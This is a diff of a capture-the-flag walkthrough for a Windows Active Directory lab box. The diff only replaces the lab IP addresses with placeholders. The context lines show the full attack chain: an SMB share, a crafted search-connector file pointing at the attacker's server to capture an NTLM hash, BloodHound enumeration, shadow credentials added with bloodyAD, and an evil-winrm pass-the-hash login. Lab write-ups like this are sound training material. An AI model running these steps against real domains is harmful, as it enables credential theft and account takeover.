@@ -10,7 +10,7 @@ tags: windows machine
 We first start by adding the box hostname to the hosts file.
 
 ```bash
-echo 10.129.9.229 fluffy.htb | sudo tee -a /etc/hosts
+echo 10.100.100.100 fluffy.htb | sudo tee -a /etc/hosts
 ```
 
 Once that's done, we do a TCP scan of the box using `nmap` to find out what kind of services are running on it.
@@ -58,7 +58,7 @@ Before pushing our recon further, we first need to fix the clock skew.
 We can do this by getting the DC time using `ldapsearch` with our starting account, `j.fleischman`.
 
 ```bash
-ldapsearch -H ldap://10.129.9.229 -D "j.fleischman@fluffy.htb" -w "[REDACTED]" -b "" -s base currentTime
+ldapsearch -H ldap://10.100.100.100 -D "j.fleischman@fluffy.htb" -w "[REDACTED]" -b "" -s base currentTime
 ```
 
 Once we have the DC time, we can set the system time using the `date` command.
@@ -73,7 +73,7 @@ Since port `445` is opened and used by `smb`, this mean there is probably some n
 We can list them using `smbclient` with our starting account, `j.fleischman`.
 
 ```bash
-smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" -L "\\10.129.9.229"
+smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" -L "\\10.100.100.100"
 ```
 
 We find the expected default shares. But, one share stands out from the rest: `IT`.
@@ -92,7 +92,7 @@ SYSVOL          Disk      Logon server share
 We can use `smbclient` again to connect to explore it further.
 
 ```bash
-smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" "\\10.129.9.229\IT"
+smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" "\\10.100.100.100\IT"
 ```
 
 Once we are connected, we can list the content of the share using `ls`.
@@ -146,7 +146,7 @@ echo '<?xml version="1.0" encoding="UTF-8"?>
   <searchConnectorDescriptionList>
     <searchConnectorDescription>
       <simpleLocation>
-        <url>\\10.10.14.41\shared</url>
+        <url>\\10.10.10.10\shared</url>
       </simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
@@ -191,7 +191,7 @@ We can see an incoming connection to our `smb` server from the user `p.agila`.
 The captured NTLM Hash is also displayed.
 
 ```bash
-09/11/2025 11:43:14 PM: INFO: Incoming connection (10.129.9.229,50657)
+09/11/2025 11:43:14 PM: INFO: Incoming connection (10.100.100.100,50657)
 09/11/2025 11:43:14 PM: INFO: AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
 09/11/2025 11:43:14 PM: INFO: User DC01\p.agila authenticated successfully
 09/11/2025 11:43:14 PM: INFO: p.agila::FLUFFY:[REDACTED-NTLMV2-HASH]
@@ -226,7 +226,7 @@ To do this, we can use `bloodhound`.
 But, before using `bloodhound` to visualize our high value targets, we first need to collect data using `bloodhound-python`.
 
 ```bash
-bloodhound-python -d fluffy.htb -u p.agila -p [REDACTED] -c All -ns 10.129.9.229
+bloodhound-python -d fluffy.htb -u p.agila -p [REDACTED] -c All -ns 10.100.100.100
 ```
 
 Once the data is collected, we can start `bloodhound` and upload the data we found with `bloodhound-python`.
@@ -251,13 +251,13 @@ This means we have a clear path to exploit.
 The first step is adding the user `p.agila` to the `Service Accounts` group using `bloodyAD`.
 
 ```bash
-./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add groupMember "Service Accounts" p.agila
+./bloodyAD.py --host 10.100.100.100 -d fluffy.htb -u p.agila -p [REDACTED] add groupMember "Service Accounts" p.agila
 ```
 
 Now that we have a `GenericWrite` permission, the next step is to add shadow credentials to the `WINRM_SVC` service account.
 
 ```bash
-./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add shadowCredentials winrm_svc
+./bloodyAD.py --host 10.100.100.100 -d fluffy.htb -u p.agila -p [REDACTED] add shadowCredentials winrm_svc
 ```
 
 This gives us the NT Hash for the `WINRM_SVC` service account.
@@ -272,7 +272,7 @@ NT: [REDACTED-NT-HASH]
 Once we have the NT Hash, we can connect with `evil-winrm` using the `WINRM_SVC` service account.
 
 ```bash
-evil-winrm -i 10.129.232.88 -u winrm_svc -H [REDACTED-NT-HASH]
+evil-winrm -i 10.100.100.100 -u winrm_svc -H [REDACTED-NT-HASH]
 ```
 
 After we connect, we can find the `user.txt` flag in the `Desktop` directory.
